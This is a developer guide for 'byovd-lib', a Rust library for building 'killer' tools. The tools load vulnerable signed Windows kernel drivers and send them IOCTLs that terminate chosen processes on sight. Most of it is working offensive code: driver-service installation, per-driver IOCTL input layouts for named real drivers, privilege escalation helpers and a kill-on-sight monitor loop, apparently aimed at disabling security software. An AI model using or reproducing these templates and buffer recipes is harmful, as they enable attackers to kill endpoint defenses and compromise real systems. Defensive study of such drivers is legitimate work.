# byovd-lib — wiring a new killer

`byovd-lib` is the shared crate in the `BlackSnufkin/BYOVD` workspace that handles the boilerplate
common to Tier-1 killers: SCM service lifecycle (install → start → stop+delete), typed IOCTL
dispatch, process lookup, privilege adjustment, a kill-on-sight monitor loop, and RAII handles.
A Tier-1 killer is ~50–100 lines that only describe the driver. Tier-2/3 killers are **standalone**
and do not use this crate (their flow doesn't fit the trait).

Two APIs, mixable: the high-level `DriverConfig` trait + `run()`, and a low-level imperative set.

---

## High-level: implement `DriverConfig`, call `run()`

```rust
use byovd_lib::{DriverConfig, Result};
use clap::Parser;

struct MyDriver;
impl DriverConfig for MyDriver {
    fn driver_name(&self) -> &str { "MyDriver" }          // SCM service name
    fn driver_file(&self) -> &str { "mydriver.sys" }      // .sys next to the exe
    fn device_path(&self) -> &str { "\\\\.\\MyDevice" }   // \\.\X from Step 2
    fn ioctl_code(&self) -> u32 { 0xDEAD }                // from Step 3
    fn build_ioctl_input(&self, pid: u32, _name: &str) -> Vec<u8> {
        // place the PID at the offset/width/encoding you reversed in Step 5
        pid.to_ne_bytes().to_vec()
    }
}

#[derive(Parser)]
struct Cli { #[arg(short='n', long="name", required=true)] process_name: String }

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&MyDriver, &cli.process_name, None)
}
```

`run()` = `preflight_check` → install service (`SERVICE_DEMAND_START`, `SERVICE_KERNEL_DRIVER`)
→ `StartService` → kill-on-sight monitor (Ctrl+C to exit) → `stop_and_delete`.

### `build_ioctl_input` recipes (match what Step 5 found)
```rust
// PID DWORD at +0
pid.to_ne_bytes().to_vec()
// PID DWORD at +4 in a 24-byte struct (TfSysMon)
let mut b = vec![0u8; 24]; b[4..8].copy_from_slice(&pid.to_ne_bytes()); b
// PID as u64 at +0 (PCTcore64, NSecKrnl)
(pid as u64).to_ne_bytes().to_vec()
// self_pid @ +0, target @ +8 (EnPortv)
let mut b = vec![0u8; 0x10];
b[0..4].copy_from_slice(&std::process::id().to_ne_bytes());
b[8..12].copy_from_slice(&pid.to_ne_bytes()); b
// magic header + pid (GameDriverX64)
let mut b = Vec::new();
b.extend_from_slice(&0xFA123456u32.to_ne_bytes());
b.extend_from_slice(&pid.to_ne_bytes()); b
// PID as ASCII string (PoisonX)
pid.to_string().into_bytes()
// kill-by-NAME, 256-byte ASCII buffer (Viragt64)
let mut b = vec![0u8; 256]; let n = name.as_bytes();
let l = n.len().min(255); b[..l].copy_from_slice(&n[..l]); b
```

### Trait-override cheatsheet (default → when to set)
| Method | Default | Set it when |
|---|---|---|
| `device_access()` | `SERVICE_ALL_ACCESS` | driver wants `GENERIC_READ\|GENERIC_WRITE` (Wsftprm, PCTcore64) |
| `skip_unload()` | `false` | driver BSODs on unload (Viragt64) |
| `ignore_ioctl_error()` | `false` | driver returns failure on success (NSecKrnl) |
| `ioctl_output_size()` | `0` | driver writes an output buffer you must size (many use 4/16) |
| `preflight_check()` | `Ok(())` | driver needs LocalSystem or a privilege (STProcessMonitor v2618) |

For a version-varying driver (STProcessMonitor v114 vs v2618), carry the version in the struct and
switch `ioctl_code()`/`preflight_check()` on it.

---

## Low-level: imperative pieces (custom flows)

Use when the trait doesn't fit — attach to an already-loaded driver, fan out to all PIDs,
structured IOCTL, custom retry.

```rust
use byovd_lib::{ByovdDriver, DeviceHandle, find_pid_by_name, find_all_pids_by_name,
                enable_privilege, ensure_running_as_local_system, run_monitor_loop};

// lifecycle
let driver = ByovdDriver::new("MyDriver", "mydriver.sys", "\\\\.\\MyDevice")?;
driver.start()?;                    // ERROR_SERVICE_ALREADY_RUNNING is OK
let device = driver.open_device()?; // DeviceHandle
driver.stop_and_delete()?;

// attach to an already-loaded driver (no SCM), fire once
let device = DeviceHandle::open("\\\\.\\eb")?;
let pid = find_pid_by_name("notepad.exe").ok_or("not running")?;
device.ioctl_in(0x222024, &pid)?;   // typed: pass &u32, no manual bytes
```

### `DeviceHandle` — five typed IOCTL shapes
| Method | Use when |
|---|---|
| `ioctl<I,O>(code,&in,&mut out)` | separate input & output structs |
| `ioctl_inout<T>(code,&mut data)` | one buffer for in + out |
| `ioctl_in<I>(code,&in)` | input only |
| `ioctl_in_unchecked<I>(code,&in)` | input only, ignore failure (per-call `ignore_ioctl_error`) |
| `ioctl_raw(code,in_ptr,in_sz,out_ptr,out_sz)` | raw pointer escape hatch |

Other pieces: `find_pid_by_name` / `find_all_pids_by_name` (excludes PIDs ≤ 4);
`run_monitor_loop(name, interval, |pid| …)` (closure per match — fan out, structured logging,
retry); `enable_privilege("SeDebugPrivilege"|"SeLoadDriverPrivilege")`;
`ensure_running_as_local_system()` (errors if not `S-1-5-18`); `WinHandle`/`ScHandle` RAII
(`Send + Sync`). Back-compat aliases: `FileHandle`/`ServiceHandle`, `get_pid_by_name`.

---

## Repo wiring (Tier 1)
1. New dir `MyDriver-Killer/` with `Cargo.toml` (member of the root workspace), `src/main.rs`
   (the `DriverConfig` + CLI), `README.md` (SHA256, LOLDrivers link, IOCTL, buffer, usage), and
   the `.sys` committed alongside.
2. Add `"MyDriver-Killer"` to the root `Cargo.toml` `[workspace].members`.
3. Add a bullet to the top-level `README.md` POC list.
4. Inherit the workspace release profile (`opt-level="z"`, `lto`, `codegen-units=1`, `strip`,
   `panic="abort"`).
Build: `cargo build --release -p MyDriver-Killer`; copy the `.sys` next to the exe; run elevated.

## Repo wiring (Tier 2 / 3 — standalone)
Own `[workspace]` + `[profile.release]` in the killer's `Cargo.toml` (NOT a root-workspace
member), typically the `windows` crate instead of `winapi`. Build from its own directory. Only a
README entry in the top-level POC list — do not add to the root `members`.
